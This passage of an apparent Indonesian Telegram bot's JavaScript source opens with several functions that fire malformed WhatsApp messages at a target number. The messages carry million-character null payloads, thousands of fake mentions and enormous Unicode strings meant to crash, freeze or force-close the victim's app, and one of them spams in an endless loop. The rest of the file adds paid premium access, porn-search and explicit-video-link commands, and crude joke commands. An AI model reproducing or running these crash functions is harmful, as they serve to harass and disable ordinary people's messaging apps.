                    stanzaId: sock.generateMessageTag(),
                    participant: target,
                    quotedMessage: {
                        conversation: x
                    },
                    mentionedJid: [target, target, target],
                    isForwarded: true,
                    forwardingScore: 999999
                }
            }
        };

        await sock.relayMessage(target, m, {
            participant: { jid: target },
            additionalAttributes: {
                category: "pler",
                push_priority: "crazy"
            }
        });

    } catch (e) {}
}

async function delayspam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

async function DelayInvisBapakLowh(sock, target) {
  while (true) {
    try {   
      const VnfMsg = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: ".../",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_Vnf",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            }
          }
        }
      };

      await sock.relayMessage(target, VnfMsg, { 
        participant: { jid: target } 
      });
      
      console.log(`Delay Hard successfully spammed to ${target}`);

      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (e) {
      console.log("❌ Error Strike:", e);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

async function CrashJnvible(sock, target) {
  try {
    const message = {
      audioMessage: {
        url: crypto.randomBytes(30000).toString("hex"),
        mimetype: "audio/ogg; codecs=opus",
        fileSha256: "A".repeat(10000),
        fileLength: "123456",
        seconds: 9999999999,
        ptt: false
      },
      contextInfo: {
        participant: target,
        mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
        ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
          paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
          },
          forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              creatorName: "Bot"
          }
        }
      }
    };

    await sock.relayMessage(target, message, {
      messageId: null
    });
    
  } catch (err) {
    console.error("Error:", err)
  }
}

async function CrashUi(sock, target) {
    await sock.relayMessage(target, {
       viewOnceMessage: {
          message: {
         groupInviteMessage: {
              groupJid: "1@g.us",
              inviteCode: "ꦽ".repeat(5000),
              inviteExpiration: "99999999999",
              groupName: "༑ ▾ try anjg ▾ ༑" + "ꦾ".repeat(250000),
              caption: " x " + "ꦾ".repeat(5000),
              body: { text: "\u200B" + "ោ៝".repeat(25000) }
             }
           }
         }
        }, { participant: { jid: target } });
    }

async function JawaTimurIsBack(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "./K茅帽贸帽f脿莽t贸r." + "軎�".repeat(10000), 
            url: "https://files.catbox.moe/6yrcjm" +  "釤勧煗".repeat(15000) + ".mp4", 
            address: "../K茅帽贸帽f脿莽t贸r." + "軎�".repeat(20000),
            contextInfo: {
              externalAdReply: {
                renderLargerThumbnail: true, 
                showAdAttribution: true, 
                body: " Function Khas Jawa", 
                title: "喑勦線".repeat(10000), 
                sourceUrl: "https://t.me/" +  "嗉�".repeat(10000),  
                thumbnailUrl: null,
              }
            }
          },

          documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "./ex3s.pdf" + "饝湨饝湢".repeat(25000),
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: false,
              jpegThumbnail: null,
          },
        }
      }
    };

    await sock.relayMessage(target, msg, {})

  } catch (err) {
    console.error("Error lol:", err);
  }
}

async function JawaTimurForcloseRelog(sock, target) {
       const options = [
        { optionName: "1msg" },
        { optionName: "execute" }
    ];
    const correctAnswer = options[1];
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- ",
                            format: "EXTENSION_1"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(1_000_000),
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: "Staff Function Khas Jawa",
                            participant: "13135550202@s.whatsapp.net",
                            fromMe: false,
                            expiration: 7205,
                            ephemeralSettingTimestamp: 2502,
                            disappearingMode: {
                                initiator: "INITIATED_BY_OTHER",
                                trigger: "ACCOUNT_SETTING"
                            },
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                requestFrom: target,
                                expiryTimestamp: null
                            }
                        }
                    }
                }
            },
            botInvokeMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32),
                        messageAssociation: {
                            associationType: 7,
                            parentMessageKey: crypto.randomBytes(16)
                        }
                    },
                    pollCreationMessage: {
                        name: "Null᭾",
                        options: options,
                        selectableOptionsCount: 1,
                        pollType: "QUIZ",
                        correctAnswer: correctAnswer
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}


/// END FUNCTION LU DISINI ///
//PLUNGWIEUDH
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//case tools
bot.onText(/\/stiktok(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const keyword = match[1]?.trim() || msg.reply_to_message?.text?.trim();

  if (!keyword) {
    return bot.sendMessage(chatId, '❌ Mohon masukkan kata kunci. Contoh: /stiktok sad');
  }

  try {
    const response = await axios.post('https://api.siputzx.my.id/api/s/tiktok', {
      query: keyword
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    const data = response.data;
    if (!data.status || !Array.isArray(data.data) || data.data.length === 0) {
      return bot.sendMessage(chatId, '⚠️ Tidak ditemukan video TikTok dengan kata kunci tersebut.');
    }

    const videos = data.data.slice(0, 3);
    let replyText = `🔎 Hasil pencarian TikTok untuk: *${keyword}*\n\n`;

    for (const video of videos) {
      const title = video.title?.trim() || 'Tanpa Judul';
      replyText += `🎬 *${title}*\n`;
      replyText += `👤 ${video.author.nickname} (@${video.author.unique_id})\n`;
      replyText += `▶️ [Link Video](${video.play})\n`;
      replyText += `🎵 Musik: ${video.music_info.title} - ${video.music_info.author}\n`;
      replyText += `⬇️ [Download WM](${video.wmplay})\n\n`;
    }

    bot.sendMessage(chatId, replyText, { parse_mode: 'Markdown' });

  } catch (error) {
    console.error(error?.response?.data || error.message);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data TikTok.');
  }
});
bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/^\/unmute(?:\s+@?(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // hanya bisa di grup
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa dipakai di grup.");
  }

  // harus reply atau sebut username
  const repliedUser = msg.reply_to_message?.from;
  const username = match[1];
  let targetUser;

  if (repliedUser) {
    targetUser = repliedUser;
  } else if (username) {
    // ambil member dari username
    try {
      const members = await bot.getChatAdministrators(chatId);
      targetUser = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())?.user;
    } catch (e) {
      console.error("Gagal ambil member:", e.message);
    }
  }

  if (!targetUser) {
    return bot.sendMessage(chatId, "❌ Balas pesan user atau sebut username untuk unmute.");
  }

  try {
    await bot.restrictChatMember(chatId, targetUser.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      }
    });

    bot.sendMessage(chatId, `✅ User [${targetUser.first_name}](tg://user?id=${targetUser.id}) sudah di-*unmute*.`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("Error unmute:", err.message);
    bot.sendMessage(chatId, "❌ Gagal unmute user. Pastikan bot punya izin admin.");
  }
});

bot.onText(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus reply pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah yang memanggil adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Mute user: hanya non-admin yang bisa dimute
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-mute.`,
            { parse_mode: 'Markdown' });

        // Balas pesan yang dimute
        await bot.sendMessage(chatId,
            '🚫 *Pengguna telah di-mute di grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});
const FormData = require("form-data");

bot.onText(/^\/xnxx(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(chatId, '🔍 Contoh penggunaan:\n/xnxx jepang');
  }

  try {
    const res = await axios.get('https://www.ikyiizyy.my.id/search/xnxx', {
      params: {
        apikey: 'new',
        q: query
      }
    });

    const results = res.data.result;

    if (!results || results.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ditemukan hasil untuk: *${query}*`, { parse_mode: 'Markdown' });
    }

    const text = results.slice(0, 3).map((v, i) => (
      `📹 *${v.title}*\n🕒 Durasi: ${v.duration}\n🔗 [Tonton Sekarang](${v.link})`
    )).join('\n\n');

    bot.sendMessage(chatId, `🔞 Hasil untuk: *${query}*\n\n${text}`, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data.');
  }
});

bot.onText(/^\/unmute(?:\s+@?(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // hanya bisa di grup
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa dipakai di grup.");
  }

  // harus reply atau sebut username
  const repliedUser = msg.reply_to_message?.from;
  const username = match[1];
  let targetUser;

  if (repliedUser) {
    targetUser = repliedUser;
  } else if (username) {
    // ambil member dari username
    try {
      const members = await bot.getChatAdministrators(chatId);
      targetUser = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())?.user;
    } catch (e) {
      console.error("Gagal ambil member:", e.message);
    }
  }

  if (!targetUser) {
    return bot.sendMessage(chatId, "❌ Balas pesan user atau sebut username untuk unmute.");
  }

  try {
    await bot.restrictChatMember(chatId, targetUser.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      }
    });

    bot.sendMessage(chatId, `✅ User [${targetUser.first_name}](tg://user?id=${targetUser.id}) sudah di-*unmute*.`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("Error unmute:", err.message);
    bot.sendMessage(chatId, "❌ Gagal unmute user. Pastikan bot punya izin admin.");
  }
});

bot.onText(/^\/muslimai(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, "🤖 Mau nanya apa ke MuslimAi?\nContoh: `/muslimai Apa arti hidup?`", {
      parse_mode: "Markdown"
    });
  }

  await bot.sendMessage(chatId, "⏳ Sedang mencari jawaban dari MuslimAi...");

  try {
    const response = await axios.get(`https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`);

    const hasil = `
*[ Muslim Ai ]*
📌 Pertanyaan: ${text}

💡 Jawaban: ${response.data.data}
`;

    bot.sendMessage(chatId, hasil, { parse_mode: "Markdown" });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses pertanyaan MuslimAi.");
  }
});
 
// Daftar khodam
const khodam = [
  "Kulkas 2 pintu", "Kumis lele", "Kumis Lele", "Lemari dua Pintu", "Kacang Hijau",
  "Kulkas mini", "Burung beo", "Air", "Api", "Batu", "Magnet", "Sempak", "Botol Tupperware",
  "Badut Mixue", "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan",
  "Upin", "Ipin", "sungut lele", "Tok Dalang", "Opah", "Opet", "Alul", "Pak Vinsen",
  "Maman Resing", "Pak RT", "Admin ETI", "Bung Towel", "Lumpia Basah", "Bjorka", "Hacker",
  "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", "Seblak", "Aromanis",
  "Gelembung sabun", "Kuda", "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan",
  "Nasi Kucing", "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang",
  "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", "Sayur Asem",
  "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", "Lintah Terbang",
  "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", "Beat Mber", "Supra Geter",
  "Oli Samping", "Knalpot Racing", "Jus Stroberi", "Jus Alpukat", "Alpukat Kocok",
  "Es Kopyor", "Es Jeruk", "@whiskeysockets/baileys", "chalk", "gradient-string",
  "@adiwajshing", "d-scrape", "undefined", "cannot read properties", "performance-now",
  "os", "node-fetch", "form-data", "axios", "util", "fs-extra", "scrape-primbon",
  "child_process", "emoji-regex", "check-disk-space", "perf_hooks", "moment-timezone",
  "cheerio", "fs", "process", "require( . . . )", "import ... from ...", "rate-overlimit",
  "Cappucino Cincau", "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu",
  "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Tutup Panci", "Kotak Amal",
  "Tutup Termos", "Tutup Botol", "Kresek Item", "Kepala Casan", "Ban Serep", "Kursi Lipat",
  "Kursi Goyang", "Kulit Pisang", "Warung Madura", "Gorong-gorong"
];

// Fungsi pilih khodam random
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())];
}

// Command: /cekkhodam <nama>
bot.onText(/^\/cekkhodam(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Masukkan nama siapa yang mau di cek khodam-nya.\n\nContoh: `/cekkhodam Jamal`", {
      parse_mode: "Markdown"
    });
  }

  const kdm = pickRandom(khodam);
  const kodamn = `*Khodam ${text} adalah:* ${kdm}`;

  bot.sendMessage(chatId, kodamn, { parse_mode: "Markdown" });
});

const paptt = [
  "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
  "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
  "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
  "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
  "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
  "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
  "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
  "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
  "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
  "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
  "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
  "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
  "https://telegra.ph/file/267744a1a8c897b1636b9.jpg"
];

// Fungsi ambil random
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

// Command: /pap
bot.onText(/^\/paptt$/, (msg) => {
  const chatId = msg.chat.id;
  if (!premiumUsers.includes(msg.from.id)) {
    return resricted(msg.from.id);
  }
  const url = pickRandom(paptt);

  // Tentukan tipe file berdasarkan ekstensi
  if (url.endsWith(".mp4")) {
    bot.sendPhoto(chatId, url, { caption: "Nohh 🎥" });
  } else if (url.endsWith(".jpg")) {
    bot.sendPhoto(chatId, url, { caption: "Nohh 📷" });
  } else {
    bot.sendMessage(chatId, "Nohh", { reply_to_message_id: msg.message_id });
  }
});

const bokep = [
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4" 
  ];
  
// Fungsi ambil random
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

// Command /cekkontol
bot.onText(/^\/cekkontol(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const q = match[1];

  if (!q) {
    return bot.sendMessage(chatId, `Ketik nama yang mau di cek.\nContoh:\n/cekkontol Rayzen bau`);
  }

  const khodam = [
    `adaa woy tapi kecil punya nya si ${q}\nahh mana sedap`,
    `gak ada jir aowkwkwk\nwoyy kontol si ${q} gada aowkwk`,
  ];

  const kodam = khodam[Math.floor(Math.random() * khodam.length)];

  const respons = `
°「 *CEK KONTOL* 」°

• *Nama:* ${q}
• *Kontol:* ${kodam}
`;

  bot.sendMessage(chatId, respons, { parse_mode: "Markdown" });
});

// Command /cekganteng
bot.onText(/^\/cekganteng(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const name = match[1];

  if (!name) {
    return bot.sendMessage(chatId, "⚠️ NAMA LU MANA??\nContoh:\n/cekganteng Rizky");
  }

  const ganteng = [
    "cuman 10% doang",
    "20% kurang ganteng soal nya",
    "0% karna nggak ganteng",
    "30% mayan gantengg",
    "40% ganteng",
    "50% Otw cari janda😎",
    "60% Orang Ganteng",
    "70% Ganteng bet",
    "80% gantengggg parah",
    "90% Ganteng idaman ciwi ciwi",
    "100% Ganteng Bgt bjirr"
  ];

  const hasil = ganteng[Math.floor(Math.random() * ganteng.length)];
  const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${name}* ${hasil}`;

  bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
});

// ====== kata kata =====
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
